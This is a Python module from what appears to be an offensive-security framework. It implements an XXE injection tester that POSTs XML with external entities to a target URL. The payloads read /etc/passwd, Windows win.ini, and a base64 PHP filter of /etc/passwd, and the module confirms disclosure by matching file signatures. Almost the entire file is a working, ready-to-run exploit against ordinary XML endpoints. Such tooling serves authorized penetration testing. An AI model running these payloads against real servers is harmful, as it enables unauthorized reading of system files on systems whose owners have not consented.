"""
modules/vuln_scan/xxe_tester.py — XML External Entity (XXE) injection tester.

POSTs XML documents containing external entities that read /etc/passwd
(and Windows equivalents) and confirms findings only when well-known file
content signatures appear in the response — the same signature sets used
by the LFI tester, so soft errors and reflections never fire.

Custom body templates are supported via the ``body_template`` option
(place ``{XXE_ENTITY}`` where the DOCTYPE/entity block should go and
``{XXE_REF}`` where the entity should be dereferenced).
"""

import logging

from rich.progress import (
    BarColumn,
    MofNCompleteColumn,
    Progress,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
)

from redkit.modules.base_module import BaseModule

logger = logging.getLogger(__name__)

# (entity_file, description) — dereferenced entity content to look for.
XXE_ENTITIES: list[tuple[str, str]] = [
    ("file:///etc/passwd", "Linux /etc/passwd"),
    ("file:///c:/windows/win.ini", "Windows win.ini"),
    ("php://filter/convert.base64-encode/resource=/etc/passwd", "PHP wrapper (base64)"),
]

# Signatures that confirm file content reached the response (shared with LFI).
XXE_SIGNATURES: dict[str, list[str]] = {
    "file:///etc/passwd": ["root:x:0:0", "root:*:0:0", "/bin/bash", "daemon:x:"],
    "file:///c:/windows/win.ini": ["[fonts]", "[extensions]", "for 16-bit app support"],
    # PHP wrapper output is base64 — confirm on the standard base64 alphabet
    # chunks of "root:x:0:0" rather than plain text.
    "php://filter/convert.base64-encode/resource=/etc/passwd": [
        "cm9vdDp4OjA6MA",  # base64("root:x:0:0")
    ],
}

DEFAULT_BODY_TEMPLATE = (
    '<?xml version="1.0" encoding="UTF-8"?>\n{XXE_ENTITY}\n<redkit><data>{XXE_REF}</data></redkit>'
)

ENTITY_BLOCK = '<!DOCTYPE redkit [ <!ENTITY xxe SYSTEM "{file}"> ]>'
ENTITY_REF = "&xxe;"


class XxeTester(BaseModule):
    """Test an XML endpoint for classic (in-band) XXE file disclosure."""

    name = "XXE Tester"
    description = "Tests an XML endpoint for XXE file disclosure via external entities."
    author = "K4os"
    category = "vuln_scan"

    options = {
        "target": {
            "value": None,
            "required": True,
            "description": "Target URL of the XML endpoint (e.g. https://example.com/api/xml).",
        },
        "body_template": {
            "value": DEFAULT_BODY_TEMPLATE,
            "required": False,
            "type": str,
            "description": (
                "XML body template. Placeholders: {XXE_ENTITY} (DOCTYPE/entity block), "
                "{XXE_REF} (entity dereference). Leave default unless the endpoint needs a "
                "specific document shape."
            ),
        },
        "timeout": {
            "value": 10,
            "required": False,
            "type": int,
            "description": "HTTP request timeout in seconds (default: 10).",
        },
    }

    @staticmethod
    def _confirm(body: str, entity_file: str) -> tuple[bool, str]:
        """Check a response body for file-content signatures of *entity_file*."""
        body_lower = body.lower()
        for sig in XXE_SIGNATURES.get(entity_file, []):
            if sig.lower() in body_lower:
                return True, sig
        return False, ""

    def run(self) -> None:
        """POST XXE documents and confirm via file-content signatures."""
        self.clear_findings()
        self.validate_options()

        target = self.get_option("target")
        template = str(self.get_option("body_template") or DEFAULT_BODY_TEMPLATE)
        http = self.http_client(target)

        confirmed: set[str] = set()

        with Progress(
            SpinnerColumn(),
            TextColumn("[bold cyan]{task.description}"),
            BarColumn(),
            MofNCompleteColumn(),
            TimeElapsedColumn(),
            transient=False,
        ) as progress:
            task = progress.add_task(f"Testing XXE on {target}", total=len(XXE_ENTITIES))
            self._progress = progress

            for entity_file, description in XXE_ENTITIES:
                progress.advance(task)
                if description in confirmed:
                    continue
                body = template.replace("{XXE_ENTITY}", ENTITY_BLOCK.format(file=entity_file))
                body = body.replace("{XXE_REF}", ENTITY_REF)
                try:
                    # A str body is sent verbatim (raw XML), not form-encoded.
                    resp = http.post(
                        target,
                        data=body,
                        headers={"Content-Type": "application/xml"},
                    )
                    confirmed_found, matched = self._confirm(resp.text, entity_file)
                    if confirmed_found and description not in confirmed:
                        confirmed.add(description)
                        logger.warning("XXE confirmed: %s (signature '%s')", description, matched)
                        self.add_finding(
                            finding_type="XXE",
                            severity="CRITICAL",
                            title=f"XXE file disclosure confirmed ({description})",
                            detail=(
                                f"The XML endpoint at {target} processed an external entity "
                                f"reading '{entity_file}' and its content appeared in the response "
                                f"(signature '{matched}'). An attacker can read arbitrary server "
                                f"files, and depending on parser configuration, perform SSRF."
                            ),
                            evidence=(
                                f"POST {target}\nContent-Type: application/xml\n"
                                f"Entity: {entity_file}\n"
                                f"Signature matched: '{matched}'\n"
                                f"Response snippet: {resp.text[:300]}"
                            ),
                            # CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H
                            cvss=9.1,
                        )
                except Exception as exc:  # noqa: BLE001 — keep scanning remaining payloads
                    logger.debug("Request error for XXE entity '%s': %s", entity_file, exc)

        total = len(self.get_findings())
        logger.info("XXE testing complete: %d finding(s).", total)
